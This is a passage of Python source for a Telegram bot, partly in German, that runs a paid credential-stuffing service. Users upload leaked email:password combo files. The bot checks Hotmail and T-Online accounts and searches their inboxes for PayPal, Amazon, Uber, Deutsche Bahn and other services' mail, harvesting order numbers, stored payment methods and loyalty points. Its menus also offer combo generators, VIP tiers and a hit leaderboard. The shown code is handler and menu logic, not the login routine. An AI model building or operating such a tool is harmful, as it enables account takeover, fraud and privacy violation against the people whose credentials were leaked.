                    f"🕐 <b>Letzte 10:</b>\n" + "\n".join(action_lines) + f"\n\n💎 {MY_SIGNATURE}")
                bot.send_message(message.chat.id, log_text, parse_mode='HTML', reply_markup=markup)
        except:
            bot.send_message(message.chat.id, "❌ Fehler beim Suchen!")
        user_sessions.pop(user_id, None)
        return

    if session.get("step") == "waiting_custom_domain":
        custom_domain = text.strip()
        if user_id in user_sessions:
            user_sessions[user_id]["custom_domain"] = custom_domain
            user_sessions[user_id]["step"] = "waiting_combo"
        bot.send_message(message.chat.id,
            f"✅ <b>Domain: {custom_domain}</b>\n\nJetzt deine Combo-Datei senden!", parse_mode='HTML')
        return

    if session.get("step") == "waiting_service" and session.get("mode") in ("inbox_single", "inbox_multi"):
        mode = session["mode"]
        if mode == "inbox_single":
            services = [text.strip()]
        else:
            services = [s.strip() for s in text.split(",") if s.strip()]

        if not services:
            bot.send_message(message.chat.id, "❌ Bitte mindestens einen Service eingeben.")
            return

        user_sessions[user_id] = {"mode": mode, "step": "waiting_combo", "services": services}
        bot.send_message(
            message.chat.id,
            t(user_id, "send_combo_for_service", services=", ".join(services)),
            parse_mode='HTML'
        )
        return

    if maintenance_mode and user_id != ADMIN_ID:
        if text in ("📋 Start Scan", "📦 Multi Scan", "🧹 Combo Cleaner", "📧 Mail Extractor",
                     "📬 Einzeln Inboxen", "📬 Mehrere Inboxen", "📬 Single Inbox", "📬 Multi Inbox",
                     "🚗 RYD Inboxen", "🏨 Limehome Inboxen", "📦 Amazon Inboxen",
                     "💰 PayPal Inboxen", "🚕 Uber Inboxen", "🍕 Lieferando Inboxen",
                     "✈️ Booking Inboxen", "👗 Zalando Inboxen", "🛴 Lime Inboxen",
                     "💳 PAYBACK Inboxen", "🚆 DB Inboxen",
                     "📦 DHL Inboxen", "🛒 Otto Inboxen", "🏷️ eBay Inboxen",
                     "🎬 Netflix Inboxen", "🎵 Spotify Inboxen",
                     "✅ Check24 Inboxen", "👠 SHEIN Inboxen", "🚌 FlixBus Inboxen",
                     "🍾 Flaschenpost Inboxen", "🍔 McDonald's Inboxen"):
            bot.send_message(message.chat.id, t(user_id, "maintenance", signature=MY_SIGNATURE), parse_mode='HTML')
            return

    KEY_REQUIRED_FEATURES = (
        "📋 Start Scan", "📦 Multi Scan", "🧹 Combo Cleaner", "📧 Mail Extractor",
        "📬 Einzeln Inboxen", "📬 Mehrere Inboxen", "📬 Single Inbox", "📬 Multi Inbox",
        "🚗 RYD Inboxen", "🏨 Limehome Inboxen", "📦 Amazon Inboxen",
        "💰 PayPal Inboxen", "🚕 Uber Inboxen", "🍕 Lieferando Inboxen",
        "✈️ Booking Inboxen", "👗 Zalando Inboxen", "🛴 Lime Inboxen",
        "💳 PAYBACK Inboxen", "🚆 DB Inboxen",
        "📦 DHL Inboxen", "🛒 Otto Inboxen", "🏷️ eBay Inboxen",
        "🎬 Netflix Inboxen", "🎵 Spotify Inboxen",
        "✅ Check24 Inboxen", "👠 SHEIN Inboxen", "🚌 FlixBus Inboxen",
        "🍾 Flaschenpost Inboxen", "🍔 McDonald's Inboxen",
        "🔀 Combo Generator", "📊 Meine Stats", "📊 My Stats",
        "📜 Scan Verlauf", "📜 Scan History"
    )
    if text in KEY_REQUIRED_FEATURES and user_id != ADMIN_ID and not in_free_group:
        if not is_vip(user_id):
            bot.send_message(message.chat.id, t(user_id, "key_required", signature=MY_SIGNATURE), parse_mode='HTML')
            return

    if _btn_match("btn_reload") or text in ("🔄 Reload", "🔄 Neu laden"):
        first_name = message.from_user.first_name or "User"
        user = get_json_user(user_id)
        vip_status = '👑 VIP' if is_vip(user_id) else 'Free'
        admin_badge = "🔧 ADMIN" if user_id == ADMIN_ID else ""
        reload_text = t(user_id, "reload", admin_badge=admin_badge, first_name=first_name,
                       uid=user_id, vip_status=vip_status,
                       points=user.get('points', 0) if user else 0, signature=MY_SIGNATURE)
        bot.send_message(user_id, reload_text, parse_mode='HTML',
                        reply_markup=main_menu_keyboard(user_id))
        return

    if _btn_match("btn_start_scan") or text == "📋 Start Scan":
        can, remaining = can_scan(user_id)
        if not can:
            bot.send_message(message.chat.id, t(user_id, "rate_limit", remaining=remaining), parse_mode='HTML')
            return
        bot.send_message(message.chat.id, t(user_id, "select_scan_mode"),
                        parse_mode='HTML', reply_markup=scan_mode_keyboard(user_id))

    elif _btn_match("btn_multi_scan") or text == "📦 Multi Scan":
        if not is_vip(user_id):
            bot.send_message(message.chat.id, t(user_id, "vip_only"), parse_mode='HTML')
        else:
            bot.send_message(message.chat.id, t(user_id, "multi_scan_prompt"), parse_mode='HTML')

    elif _btn_match("btn_my_stats") or text in ("📊 My Stats", "📊 Meine Stats"):
        user = get_user(user_id)
        if user:
            stats_text = f"""
📊 <b>Your Statistics</b>

👤 <b>User Info:</b>
• ID: <code>{user[0]}</code>
• Username: @{user[1] or 'N/A'}
• Status: {'👑 VIP' if user[2] else '⭐ Free'}
• Joined: {user[12][:10] if user[12] else 'N/A'}

📈 <b>Scan History:</b>
• Total Scans: {user[10] or 0}
• Total Hits: {user[11] or 0}

⏰ <b>Last Scan:</b>
{user[9][:19] if user[9] else 'Never'}

💎 <b>Created by {MY_SIGNATURE}</b>
"""
            bot.send_message(message.chat.id, stats_text, parse_mode='HTML')

    elif _btn_match("btn_membership") or text in ("👑 Membership", "👑 Mitgliedschaft"):
        user = get_user(user_id)
        first_name = message.from_user.first_name or "User"
        username_display = f"@{message.from_user.username}" if message.from_user.username else str(user_id)

        if user_id == ADMIN_ID:
            role = "🔧 ADMIN"
            role_badge = "Administrator"
            vip_until = user[3] if user else "Forever"
            if vip_until == "Forever":
                expiry = "♾️ Lifetime"
            elif vip_until:
                expiry = vip_until[:19]
            else:
                expiry = "♾️ Lifetime"

            membership_text = f"""
🔧 <b>ADMIN MEMBERSHIP</b>

👤 <b>Name:</b> {first_name}
🆔 <b>User:</b> {username_display}
🏷️ <b>Role:</b> {role_badge}
✅ <b>Status:</b> Active
⏰ <b>Valid Until:</b> {expiry}

🎁 <b>Your Permissions:</b>
✅ All bot features
✅ Admin Panel access
✅ Unlimited scans
✅ TikTok Full Capture
✅ User management
✅ VIP/Ban controls

💎 <b>{MY_SIGNATURE}</b>
"""
        elif user and user[2] and is_vip(user_id):
            vip_until = user[3]
            if vip_until == "Forever":
                expiry = "♾️ Lifetime VIP"
                plan_name = "👑 VIP Forever"
            else:
                expiry = vip_until[:19] if vip_until else "Unknown"
                plan_name = "👑 VIP"

            membership_text = f"""
👑 <b>VIP MEMBERSHIP</b>

👤 <b>Name:</b> {first_name}
🆔 <b>User:</b> {username_display}
🏷️ <b>Plan:</b> {plan_name}
✅ <b>Status:</b> Active
⏰ <b>Valid Until:</b> {expiry}

🎁 <b>Your Benefits:</b>
✅ Unlimited scans
✅ Multi-scan feature
✅ TikTok Full Capture
✅ Priority support

💎 <b>{MY_SIGNATURE}</b>
"""
        else:
            membership_text = f"""
⭐ <b>FREE MEMBERSHIP</b>

👤 <b>Name:</b> {first_name}
🆔 <b>User:</b> {username_display}
🏷️ <b>Plan:</b> Free
📊 <b>Status:</b> Active

📋 <b>Your Features:</b>
✅ 1 scan per hour
✅ All scan modes
✅ AI Platforms check

👑 <b>Upgrade to VIP:</b>
💎 Unlimited scans
💎 TikTok Full Capture
💎 Multi-scan feature

📞 <b>Contact admin to upgrade!</b>

💎 <b>{MY_SIGNATURE}</b>
"""
        bot.send_message(message.chat.id, membership_text, parse_mode='HTML')

    elif _btn_match("btn_scan_history") or text in ("📜 Scan History", "📜 Scan Verlauf"):
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT scan_date, scan_mode, hits_count, bad_count, total_checked FROM scans WHERE user_id = ? ORDER BY scan_id DESC LIMIT 10", (user_id,))
        scans = c.fetchall()
        conn.close()

        if not scans:
            bot.send_message(message.chat.id,
                "📜 <b>SCAN HISTORY</b>\n\n"
                "❌ No scans yet!\n\n"
                "Start your first scan with 📋 Start Scan",
                parse_mode='HTML')
        else:
            history_text = "📜 <b>SCAN HISTORY</b>\n<i>Last 10 scans</i>\n\n"
            for i, scan in enumerate(scans, 1):
                scan_date = scan[0][:16] if scan[0] else "Unknown"
                mode = scan[1] or "Standard"
                hits = scan[2] or 0
                bad = scan[3] or 0
                total = scan[4] or 0
                hit_rate = round((hits / total * 100), 1) if total > 0 else 0

                history_text += (
                    f"<b>#{i}</b> 📅 {scan_date}\n"
                    f"   🔎 Mode: <b>{mode}</b>\n"
                    f"   ✅ Hits: <b>{hits}</b> | ❌ Bad: {bad} | 📊 Total: {total}\n"
                    f"   📈 Hit Rate: <b>{hit_rate}%</b>\n\n"
                )

            history_text += f"💎 {MY_SIGNATURE}"
            bot.send_message(message.chat.id, history_text, parse_mode='HTML')

    elif _btn_match("btn_referral") or text in ("🔗 My Referral", "🔗 Mein Referral"):
        user = get_user(user_id)
        if user:
            ref_code = user[6]  # referral_code
            ref_count = user[8]  # referrals_count

            # Get bot username
            bot_info = bot.get_me()
            ref_link = f"https://t.me/{bot_info.username}?start={ref_code}"

            # Create share button
            markup = types.InlineKeyboardMarkup()
            share_btn = types.InlineKeyboardButton(
                "📤 Share Link", 
                url=f"https://t.me/share/url?url={urllib.parse.quote(ref_link)}&text={urllib.parse.quote('Join the best Hotmail checker bot!')}"
            )
            markup.add(share_btn)

            referral_text = f"""
🔗 <b>Your Referral System</b>

👥 <b>How it works:</b>
Share your link and get <b>+1 hour VIP</b> per new user!

🎯 <b>Your Referral Link:</b>
<code>{ref_link}</code>

📊 <b>Your Stats:</b>
• Total Referrals: <b>{ref_count}</b> users
• VIP Earned: <b>{ref_count}</b> hour(s)

💡 <b>Tip:</b>
Share the link on social media to get more referrals!

💎 <b>{MY_SIGNATURE}</b>
"""
            bot.send_message(message.chat.id, referral_text, 
                           parse_mode='HTML',
                           reply_markup=markup)
        return  # IMPORTANT: Stop here to prevent repeating!

    elif _btn_match("btn_support") or text == "📞 Support":
        support_text = f"""
📞 <b>SUPPORT</b>

💬 <b>Contact Developer:</b>
• Telegram: {MY_SIGNATURE}

💎 <b>Created by {MY_SIGNATURE}</b>
"""
        bot.send_message(message.chat.id, support_text, parse_mode='HTML')

    elif _btn_match("btn_single_inbox") or text in ("📬 Einzeln Inboxen", "📬 Single Inbox"):
        user_sessions[user_id] = {"mode": "inbox_single", "step": "waiting_service"}
        bot.send_message(
            message.chat.id,
            "📬 <b>EINZELN INBOXEN</b>\n\n"
            "Schreib mir den Service-Namen den du checken willst.\n\n"
            "Beispiele:\n"
            "• <code>Reddit</code>\n"
            "• <code>Check24</code>\n"
            "• <code>Amazon</code>\n"
            "• <code>PayPal</code>",
            parse_mode='HTML'
        )

    elif _btn_match("btn_multi_inbox") or text in ("📬 Mehrere Inboxen", "📬 Multi Inbox"):
        user_sessions[user_id] = {"mode": "inbox_multi", "step": "waiting_service"}
        bot.send_message(
            message.chat.id,
            "📬 <b>MEHRERE INBOXEN</b>\n\n"
            "Schreib mir die Services die du checken willst.\n"
            "Kommagetrennt eingeben:\n\n"
            "Beispiel:\n"
            "<code>Reddit, Check24, Amazon, PayPal</code>",
            parse_mode='HTML'
        )

    elif text == "🚗 RYD Inboxen":
        user_sessions[user_id] = {"mode": "inbox_ryd", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🚗 <b>RYD INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>noreply@ryd.one</code>\n"
            "• Bestellungen (Ride-Buchungen)\n"
            "• Hinterlegte Zahlungsmethode\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "🏨 Limehome Inboxen":
        user_sessions[user_id] = {"mode": "inbox_limehome", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🏨 <b>LIMEHOME INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>limehome.com</code>\n"
            "• Buchungen & Reservierungen\n"
            "• Hinterlegte Zahlungsmethode\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "📦 Amazon Inboxen":
        user_sessions[user_id] = {"mode": "inbox_amazon", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "📦 <b>AMAZON INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>amazon.de / amazon.com</code>\n"
            "• Bestellnummern & Versandbestätigungen\n"
            "• Hinterlegte Zahlungsmethode\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "💰 PayPal Inboxen":
        user_sessions[user_id] = {"mode": "inbox_paypal", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "💰 <b>PAYPAL INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>paypal.de / paypal.com</code>\n"
            "• Transaktionen & Zahlungen\n"
            "• Hinterlegte Zahlungsmethode\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "🚕 Uber Inboxen":
        user_sessions[user_id] = {"mode": "inbox_uber", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🚕 <b>UBER INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>uber.com</code>\n"
            "• Fahrten & Uber Eats Bestellungen\n"
            "• Hinterlegte Zahlungsmethode\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "🍕 Lieferando Inboxen":
        user_sessions[user_id] = {"mode": "inbox_lieferando", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🍕 <b>LIEFERANDO INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>lieferando.de</code>\n"
            "• Bestellungen & Lieferungen\n"
            "• Hinterlegte Zahlungsmethode\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "✈️ Booking Inboxen":
        user_sessions[user_id] = {"mode": "inbox_booking", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "✈️ <b>BOOKING.COM INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>booking.com</code>\n"
            "• Buchungen & Reservierungen\n"
            "• Hinterlegte Zahlungsmethode\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "👗 Zalando Inboxen":
        user_sessions[user_id] = {"mode": "inbox_zalando", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "👗 <b>ZALANDO INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>zalando.de / zalando.com</code>\n"
            "• Bestellungen & Retouren\n"
            "• Hinterlegte Zahlungsmethode\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "🛴 Lime Inboxen":
        user_sessions[user_id] = {"mode": "inbox_lime", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🛴 <b>LIME INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>no-reply@li.me</code>\n"
            "• Fahrten & Trips\n"
            "• Hinterlegte Zahlungsmethode\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "💳 PAYBACK Inboxen":
        user_sessions[user_id] = {"mode": "inbox_payback", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "💳 <b>PAYBACK INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>service@payback.de</code>\n"
            "• 💰 <b>Punktestand</b> (wie viele Punkte)\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "🚆 DB Inboxen":
        user_sessions[user_id] = {"mode": "inbox_deutschebahn", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🚆 <b>DEUTSCHE BAHN INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>noreply@bahn.de</code>\n"
            "• Emails von <code>noreply@deutschebahn.com</code>\n"
            "• 🎫 Buchungsnummern & Tickets\n"
            "• Hinterlegte Zahlungsmethode\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "📦 DHL Inboxen":
        user_sessions[user_id] = {"mode": "inbox_dhl", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "📦 <b>DHL INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>noreply@dhl.de</code>\n"
            "• Emails von <code>paket@dhl.de</code>\n"
            "• 📬 Sendungsnummern & Tracking\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "🛒 Otto Inboxen":
        user_sessions[user_id] = {"mode": "inbox_otto", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🛒 <b>OTTO INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>noreply@otto.de</code>\n"
            "• Emails von <code>service@otto.de</code>\n"
            "• 📦 Bestellnummern\n"
            "• Hinterlegte Zahlungsmethode\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "🏷️ eBay Inboxen":
        user_sessions[user_id] = {"mode": "inbox_ebay", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🏷️ <b>EBAY INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>ebay@ebay.de</code>\n"
            "• Emails von <code>reply@ebay.de</code>\n"
            "• 🛍️ Artikelnummern & Bestellungen\n"
            "• Hinterlegte Zahlungsmethode\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "🎬 Netflix Inboxen":
        user_sessions[user_id] = {"mode": "inbox_netflix", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🎬 <b>NETFLIX INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>info@account.netflix.com</code>\n"
            "• 🎥 Account & Abo-Infos\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "🎵 Spotify Inboxen":
        user_sessions[user_id] = {"mode": "inbox_spotify", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🎵 <b>SPOTIFY INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>no-reply@spotify.com</code>\n"
            "• 🎧 Account & Abo-Infos\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "✅ Check24 Inboxen":
        user_sessions[user_id] = {"mode": "inbox_check24", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "✅ <b>CHECK24 INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>noreply@check24.de</code>\n"
            "• Emails von <code>info@check24.de</code>\n"
            "• 📋 Vertrags- & Auftragsnummern\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "👠 SHEIN Inboxen":
        user_sessions[user_id] = {"mode": "inbox_shein", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "👠 <b>SHEIN INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>noreply@sheinnotice.com</code>\n"
            "• 🛍️ Bestellnummern\n"
            "• Hinterlegte Zahlungsmethode\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "🚌 FlixBus Inboxen":
        user_sessions[user_id] = {"mode": "inbox_flixbus", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🚌 <b>FLIXBUS INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>noreply@flixbus.com</code>\n"
            "• Emails von <code>booking@flixbus.com</code>\n"
            "• 🎫 Buchungsnummern\n"
            "• Hinterlegte Zahlungsmethode\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "🍾 Flaschenpost Inboxen":
        user_sessions[user_id] = {"mode": "inbox_flaschenpost", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🍾 <b>FLASCHENPOST INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>noreply@flaschenpost.de</code>\n"
            "• Emails von <code>info@flaschenpost.de</code>\n"
            "• 📦 Bestellnummern\n"
            "• Hinterlegte Zahlungsmethode\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif text == "🍔 McDonald's Inboxen":
        user_sessions[user_id] = {"mode": "inbox_mcdonalds", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🍔 <b>McDONALD'S INBOXEN</b>\n\n"
            "Checkt Hotmail- <b>und</b> T-Online-Combos auf:\n"
            "• Emails von <code>noreply@mcdonalds.de</code>\n"
            "• Emails von <code>mcdonalds@email.mcdonalds.com</code>\n"
            "• 📦 Bestellnummern\n"
            "• Hinterlegte Zahlungsmethode\n\n"
            "📁 Schick jetzt deine Combo-Datei!\n"
            "Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif _btn_match("btn_mail_extractor") or text == "📧 Mail Extractor":
        user_sessions[user_id] = {"mode": "mail_extractor"}
        bot.send_message(
            message.chat.id,
            "📧 <b>MAIL EXTRACTOR</b>\n\n"
            "Schick mir deine Combo-Datei (.txt)\n\n"
            "Ich sende dir nur die <b>gültigen Email-Adressen</b> zurück.\n\n"
            "📁 Format: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif _btn_match("btn_combo_gen") or text in ("🔀 Combo Generator",):
        user_sessions[user_id] = {"mode": "combo_gen", "step": "waiting_emails"}
        bot.send_message(
            message.chat.id,
            "🔀 <b>COMBO GENERATOR</b>\n\n"
            "Erstellt Combos aus einer Email-Liste + Passwort-Liste.\n\n"
            "📧 <b>Schritt 1:</b> Schick mir die <b>Email-Liste</b> (.txt)\n"
            "Eine Email pro Zeile:\n"
            "<code>user1@hotmail.com\nuser2@t-online.de\nuser3@freenet.de</code>",
            parse_mode='HTML'
        )

    elif text == "🔑 Redeem Key" or (text and text.startswith("/redeem")):
        user_sessions[user_id] = {"mode": "redeem_code"}
        bot.send_message(
            message.chat.id,
            "🔑 <b>KEY EINLÖSEN</b>\n\n"
            "Sende deinen Redeem-Code:",
            parse_mode='HTML'
        )

    elif text == "🏆 Leaderboard":
        top_users = get_leaderboard()
        if not top_users:
            bot.send_message(message.chat.id, "Noch keine User!")
        else:
            msg = "🏆 <b>TOP 10 LEADERBOARD</b>\n\n"
            medals = ["🥇", "🥈", "🥉"]
            for i, u in enumerate(top_users, 1):
                medal = medals[i-1] if i <= 3 else f"{i}."
                name = u.get('name', 'User')
                hits = u.get('total_hits', 0)
                msg += f"{medal} {name} - {hits} hits\n"
            msg += f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n💎 {MY_SIGNATURE}"
            bot.send_message(message.chat.id, msg, parse_mode='HTML')

    elif text == "🎁 Daily Claim":
        success, msg_text = claim_daily(user_id)
        bot.send_message(message.chat.id, msg_text)

    elif _btn_match("btn_combo_cleaner") or text == "🧹 Combo Cleaner":
        user_sessions[user_id] = {"mode": "combo_cleaner"}
        bot.send_message(
            message.chat.id,
            "🧹 <b>COMBO CLEANER</b>\n\n"
            "Schick mir deine Combo-Datei (.txt)\n\n"
            "Ich entferne:\n"
            "✅ Duplikate\n"
            "✅ Ungültige Zeilen (ohne email:pass)\n"
            "✅ Leere Zeilen\n"
            "✅ Ungültige Email-Formate\n\n"
            "📁 Format muss sein: <code>email:passwort</code>",
            parse_mode='HTML'
        )

    elif _btn_match("btn_admin") or text in ("🔧 Admin Panel",):
        if user_id != ADMIN_ID:
            bot.send_message(message.chat.id, t(user_id, "access_denied"), parse_mode='HTML')
            return
        bot.send_message(message.chat.id, t(user_id, "admin_panel"),
                        parse_mode='HTML', reply_markup=admin_panel_keyboard())

# Handle Callback Queries
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id

    # Check if banned
    if is_banned(user_id):
        bot.answer_callback_query(call.id, "❌ You are banned!", show_alert=True)
        return

    if call.data.startswith("set_lang_"):
        lang = call.data.replace("set_lang_", "")
        set_lang(user_id, lang)
        bot.answer_callback_query(call.id, "✅")
        bot.edit_message_text(t(user_id, "language_changed"),
                             call.message.chat.id, call.message.message_id, parse_mode='HTML')
        bot.send_message(call.message.chat.id, t(user_id, "reload",
                        admin_badge="🔧 ADMIN" if user_id == ADMIN_ID else "",
                        first_name=call.from_user.first_name or "User",
                        user_id=user_id,
                        vip_status='👑 VIP' if is_vip(user_id) else 'Free',
                        points=0, signature=MY_SIGNATURE),
                        parse_mode='HTML', reply_markup=main_menu_keyboard(user_id))
        return

    if call.data.startswith("admin_") and user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Access Denied! Admin only.", show_alert=True)
        return

    # VIP Required
    if call.data == "vip_required":
        bot.answer_callback_query(call.id, "👑 VIP membership required!", show_alert=True)
        return

    # VIP Forever Required (for TikTok)
    if call.data == "vip_forever_required":
        bot.answer_callback_query(call.id, "👑 VIP Forever membership required for TikTok Full Capture!", show_alert=True)
        return

    # Stop Scan
    if call.data.startswith("stop_scan_"):
        scan_user_id = int(call.data.replace("stop_scan_", ""))
        if scan_user_id == user_id or user_id == ADMIN_ID:
            if scan_user_id in active_scans:
                active_scans[scan_user_id] = False
                bot.answer_callback_query(call.id, "⏹ Scan stopped!", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "No active scan found", show_alert=True)
        return

    # Scan Mode Selection
    if call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")

        # Handle single platform selection
        if mode == "single_platform":
            bot.edit_message_text(
                "🎯 <b>Select Single Platform</b>\n\n"
                "Choose ONE platform to check:",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='HTML',
                reply_markup=single_platform_keyboard()
            )
            return

        # Store mode
        user_sessions[user_id] = {"mode": mode}

        description = get_mode_description(mode)

        if mode == "custom":
            bot.edit_message_text(
                description +
                f"\n\n📝 <b>Send the domain name:</b>\n"
                f"Example: netflix.com",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='HTML'
            )
            user_sessions[user_id]["step"] = "waiting_custom_domain"
        else:
            bot.edit_message_text(
                description +
                f"\n\n📁 <b>Now send your combo file</b>\n"
                f"Format: email:password",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='HTML'
            )

    # Platform Selection (for single platform mode)
    if call.data.startswith("platform_"):
        platform_name = call.data.replace("platform_", "")

        # Store mode as "single" and the platform
        user_sessions[user_id] = {
            "mode": "single",
            "platform": platform_name
        }

        bot.edit_message_text(
            f"✅ <b>Selected: {platform_name}</b>\n\n"
            f"Will check {platform_name} only!\n\n"
            f"📁 <b>Now send combo file</b>",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
        return

    # Back to scan modes
    if call.data == "back_to_scan_modes":
        bot.edit_message_text(
            "⚡ <b>SELECT SCAN MODE</b>",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=scan_mode_keyboard(user_id)
        )
        return

    # Admin Panel Callbacks
    elif call.data == "admin_panel":
        bot.edit_message_text(
            "🔧 <b>ADMIN PANEL</b>\n\nSelect an option:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=admin_panel_keyboard()
        )

    elif call.data == "admin_add_vip":
        user_sessions[user_id] = {"mode": "admin_add_vip", "step": "waiting_id"}
        bot.edit_message_text(
            "➕ <b>ADD VIP MEMBER</b>\n\n"
            "Sende die User ID:\n\n"
            "Beispiel: <code>123456789</code>",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )

    elif call.data == "admin_remove_vip":
        user_sessions[user_id] = {"mode": "admin_remove_vip"}
        bot.edit_message_text(
            "➖ <b>REMOVE VIP</b>\n\n"
            "Sende die User ID:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )

    elif call.data == "admin_list_vips":
        vips = get_all_vips()

        if not vips:
            vip_text = "📋 <b>VIP MEMBERS</b>\n\n❌ No VIP members"
        else:
